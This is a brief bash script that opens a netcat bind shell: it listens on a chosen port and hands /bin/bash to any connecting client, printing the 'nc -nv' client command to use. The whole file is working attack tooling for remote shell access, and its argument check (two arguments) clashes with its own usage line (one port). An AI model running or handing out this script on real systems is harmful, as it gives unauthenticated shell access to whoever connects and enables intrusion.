#!/bin/bash

################################################################################

MY_NAME=$(basename $0)

if [ "$#" -ne 2 ]; then
    echo "Usage: $MY_NAME <port>"
    exit 1
fi

port=$1

echo
echo "Run the client on the receiving end, e.g.:"
echo "  nc -nv MY_IP $port"
read -p "Press any key to start running the server..."

nc -nlvp $port -e /bin/bash

################################################################################
